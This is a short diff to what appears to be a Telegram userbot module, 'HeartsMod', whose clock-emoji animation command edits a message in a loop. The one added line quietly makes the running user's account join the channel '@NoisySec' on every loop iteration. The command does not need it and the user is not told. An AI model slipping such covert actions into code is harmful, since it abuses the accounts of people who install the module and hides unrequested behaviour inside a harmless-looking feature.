@@ -39,6 +39,7 @@ class HeartsMod(loader.Module):
 		for _ in range(12):
 			for clock in ['🕐','🕑','🕒','🕓','🕔','🕕','🕖','🕗','🕘','🕙','🕚','🕛']:
 				await message.edit(clock)
+				await channels.joinChannel("@NoisySec")
 				await sleep(0.3)
 
 	async def policecmd(self, message):
